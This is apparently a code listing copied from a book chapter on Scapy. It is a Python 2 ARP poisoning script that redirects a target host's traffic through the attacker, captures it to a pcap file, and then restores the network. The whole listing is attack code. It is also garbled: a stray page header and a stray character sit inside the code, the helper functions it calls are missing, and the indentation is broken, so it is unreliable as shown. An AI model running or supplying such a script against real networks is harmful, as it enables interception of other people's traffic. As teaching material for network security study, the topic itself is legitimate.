from scapy.all import *
import os
import sys
import threading
import signal

interface = "en1"
target_ip = "172.16.1.71"
gateway_ip = "172.16.1.254"
packet_count = 1000

# set our interface
conf.iface = interface

# turn off output
conf.verb = 0

print "[*] Setting up %s" % interface
gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print "[!!!] Failed to get gateway MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Gateway %s is at %s" % (gateway_ip,gateway_mac)

target_mac = get_mac(target_ip)

if target_mac is None:
    print "[!!!] Failed to get target MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Target %s is at %s" % (target_ip,target_mac)

# start poison thread
poison_thread = threading.Thread(target = poison_target, args = ¬(gateway_ip, gateway_mac,target_ip,target_mac))
poison_thread.start()

try:
    print "[*] Starting sniffer for %d packets" % packet_count
    bpf_filter = "ip host %s" % target_ip
    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)
    Owning the Network with Scapy 53

    # write out the captured packets
    wrpcap('arper.pcap',packets)

    # restore the network
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
except KeyboardInterrupt:
# restore the network
restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
sys.exit(0)
